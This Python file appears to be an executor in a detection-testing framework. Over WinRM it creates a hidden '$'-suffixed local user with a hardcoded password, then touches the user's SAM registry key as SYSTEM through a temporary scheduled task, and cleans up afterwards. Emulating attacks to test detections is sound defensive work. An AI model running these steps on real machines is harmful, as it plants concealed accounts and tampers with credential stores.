# rules/engine/executors/hidden_user.py
"""DIRECT_WINRM #23: create a hidden local user ($-suffixed) with a timestamped name,
modify it, and touch its SAM registry key as SYSTEM to force a fresh registry event."""
import time, datetime
from executors.registry import register
from executors._net import now_iso
from result import make_result

@register("hidden_user")
def hidden_user(usecase, ctx):
    session = ctx.winrm_factory() if ctx.winrm_factory else None
    suffix = datetime.datetime.now().strftime("%H%M%S")
    username = f"TstHdn{suffix}$"
    start = now_iso()
    try:
        session.run_cmd("cmd", ["/c", f"net user {username} /delete 2>nul"])
        time.sleep(2)
        r = session.run_cmd("cmd", ["/c", f"net user {username} P@ssW0rd123! /add"])
        stdout = r.std_out.decode("utf-8", errors="replace").strip()
        stderr = r.std_err.decode("utf-8", errors="replace").strip()
        output = stdout or stderr
        time.sleep(1)
        session.run_ps(
            f'try {{ Set-LocalUser -Name "{username}" -Description "Detection test user" -EA Stop; '
            f'Write-Host "Modified {username} description" }} catch {{ Write-Host "Set-LocalUser: $_" }}'
        )
        ps_cmd = (
            f'$taskName = "SamTouch{suffix}"; '
            f'$action = New-ScheduledTaskAction -Execute "reg.exe" '
            f'-Argument "add `"HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\{username}`" /v DetTest /t REG_DWORD /d 1 /f"; '
            f'$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest; '
            f'Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null; '
            f'Start-ScheduledTask -TaskName $taskName; '
            f'Start-Sleep -Seconds 3; '
            f'Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA SilentlyContinue'
        )
        session.run_ps(ps_cmd)
        end = now_iso()
        time.sleep(10)
        session.run_cmd("cmd", ["/c", f"net user {username} /delete 2>nul"])
        if r.status_code == 0:
            return make_result(usecase, "SUCCESS", True, attack_start=start, attack_end=end,
                               op_id="direct-hidden-user",
                               output=f"Created hidden user {username}, modified + SAM-touched as SYSTEM. {output}")
        return make_result(usecase, f"NET_USER_FAIL: {output[:200]}", False,
                           attack_start=start, attack_end=end, output=output)
    except Exception as e:
        try:
            session.run_cmd("cmd", ["/c", f"net user {username} /delete 2>nul"])
        except Exception:
            pass
        return make_result(usecase, f"ERROR: {e}", False, attack_start=start, attack_end=now_iso())
